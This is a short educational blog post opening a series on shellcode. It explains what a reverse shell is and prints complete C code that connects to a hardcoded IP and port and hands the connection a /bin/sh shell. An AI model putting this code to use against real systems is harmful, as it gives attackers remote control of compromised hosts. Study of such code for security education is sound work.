---
layout: post
title: "Understanding Shellcode: The Reverse Shell"
category: Security
date: 2018-10-30
series: "Understanding Shellcode"
tags:
  - Shellcode
  - Security
---
A recent conversation with a coworker inspired me to start putting
together a series of blog posts to examine what it is that shellcode does.  In
the first installment, I'll dissect the basic reverse shell.

First, a couple of reminders: shellcode is the machine code that is injected
into the flow of a program as the result of an exploit.  It generally must be
position independent as you can't usually control where it will be loaded in
memory.  A reverse shell initiates a TCP connection from the compromised host
back to a host under the control of the attacker.  It then launches a shell with
which the attacker can interact.

<!--more-->

## Reverse Shell in C ##

```
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

void reverse_shell() {
  /* Allocate a socket for IPv4/TCP */
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  /* Setup the connection structure. */
  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_port = htons(4444);
  /* Parse the IP address */
  inet_pton(AF_INET, "192.168.22.33", &sin.sin_addr.s_addr);
  /* Connect to the remote host */
  connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));
  /* Duplicate the socket to STDIO */
  dup2(sock, STDIN_FILENO);
  dup2(sock, STDOUT_FILENO);
  dup2(sock, STDERR_FILENO);
  /* Setup and execute a shell. */
  char *argv[] = {"/bin/sh", NULL};
  execve("/bin/sh", argv, NULL);
}
```
